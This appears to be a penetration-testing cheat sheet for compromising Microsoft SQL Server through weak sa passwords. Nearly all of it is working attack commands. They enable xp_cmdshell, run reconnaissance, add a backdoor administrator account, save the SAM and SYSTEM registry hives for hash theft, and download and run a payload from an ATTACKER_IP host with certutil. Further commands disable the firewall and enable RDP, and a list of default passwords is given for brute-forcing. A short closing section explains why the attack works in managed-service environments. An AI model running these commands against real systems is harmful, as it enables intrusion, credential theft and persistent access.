# SQL Server Attack Commands

## Quick Reference

### Connect with weak creds
```bash
# Using the exploit script
python3 sql_exploit.py 192.168.122.100 -u sa -p admin --shell

# Or using mssqlclient (impacket)
impacket-mssqlclient sa:admin@192.168.122.100
```

### Manual SQL commands (once connected)

**Enable xp_cmdshell:**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Check privilege level:**
```sql
EXEC xp_cmdshell 'whoami';
-- Hoping for: NT AUTHORITY\SYSTEM or NT SERVICE\MSSQLSERVER
```

**Basic recon:**
```sql
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net users';
EXEC xp_cmdshell 'net localgroup administrators';
```

**Create backdoor admin:**
```sql
EXEC xp_cmdshell 'net user backdoor P@ssw0rd123! /add';
EXEC xp_cmdshell 'net localgroup administrators backdoor /add';
```

**Dump SAM hashes (if SYSTEM):**
```sql
EXEC xp_cmdshell 'reg save HKLM\SAM C:\temp\sam';
EXEC xp_cmdshell 'reg save HKLM\SYSTEM C:\temp\system';
```

**Download and execute payload:**
```sql
EXEC xp_cmdshell 'certutil -urlcache -f http://ATTACKER_IP/shell.exe C:\temp\shell.exe';
EXEC xp_cmdshell 'C:\temp\shell.exe';
```

**Disable firewall:**
```sql
EXEC xp_cmdshell 'netsh advfirewall set allprofiles state off';
```

**Enable RDP:**
```sql
EXEC xp_cmdshell 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f';
```

## Common weak SA passwords to try

```
sa:sa
sa:admin
sa:password
sa:Password1
sa:sql
sa:SQL
sa:sa123
sa:123456
sa:<blank>
sa:<company_name>
```

## Why this works

1. **SA account** is the built-in sysadmin - full control over SQL Server
2. **xp_cmdshell** is a legitimate feature (disabled by default, but SA can enable it)
3. **SQL Server service** often runs as SYSTEM or a privileged domain account
4. Weak SA password = full OS compromise

## MSP reality check

- Vendors install SQL Express with weak SA passwords
- "It's just the database for $APP, who cares"
- Nobody audits SQL Server security
- One weak password â†’ entire network compromised
